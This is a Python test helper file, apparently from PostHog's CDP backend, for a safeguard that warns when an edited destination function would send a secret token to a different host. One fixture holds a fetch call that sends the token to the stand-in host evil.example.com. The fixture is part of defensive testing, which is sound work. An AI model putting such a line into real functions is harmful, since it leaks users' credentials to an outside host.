from collections.abc import Iterator
from contextlib import AbstractContextManager, contextmanager
from typing import Any, Optional

from unittest.mock import patch

from prometheus_client import REGISTRY

from products.cdp.backend.api.hog_function import SecretBindingMetric

SENDER_URL = "https://hooks.example.com/a"
MOVED_URL = "https://evil.example.com/a"
SENDER_HOG = "fetch(inputs.url, {'headers': {'Authorization': inputs.token}});"
MOVED_SENDER_HOG = "fetch('https://evil.example.com', {'headers': {'Authorization': inputs.token}});"
MOVED_DETAIL = (
    "This change sends Token to evil.example.com. Until now it was only sent to hooks.example.com. "
    "Enter it again to confirm."
)
SECRET_SENDER: dict[str, Any] = {
    "name": "Secret sender",
    "type": "destination",
    "hog": SENDER_HOG,
    "inputs_schema": [
        {"key": "url", "type": "string", "label": "URL", "required": True},
        {"key": "token", "type": "string", "label": "Token", "secret": True, "required": False},
    ],
    "inputs": {"url": {"value": SENDER_URL}, "token": {"value": "I AM SECRET"}},
}


def sender_inputs(url: str, token: Optional[dict] = None) -> dict:
    return {"url": {"value": url}, "token": token or {"secret": True}}


def secret_host_binding_flag(enabled: bool) -> AbstractContextManager[Any]:
    return patch(
        "products.cdp.backend.api.hog_function.posthoganalytics.feature_enabled",
        side_effect=lambda flag, *args, **kwargs: enabled and flag == "cdp-secret-host-binding",
    )


def _binding_counts(surface: str) -> dict[str, float]:
    return {
        outcome.value: REGISTRY.get_sample_value(
            "posthog_cdp_secret_host_binding_total", {"outcome": outcome.value, "surface": surface}
        )
        or 0.0
        for outcome in SecretBindingMetric
    }


@contextmanager
def counted_bindings(surface: str) -> Iterator[dict[str, float]]:
    """Fills the yielded dict, on exit, with each outcome the block counted for `surface` and how often."""
    counted: dict[str, float] = {}
    before = _binding_counts(surface)
    yield counted
    after = _binding_counts(surface)
    counted.update(
        {outcome: after[outcome] - before[outcome] for outcome in after if after[outcome] != before[outcome]}
    )
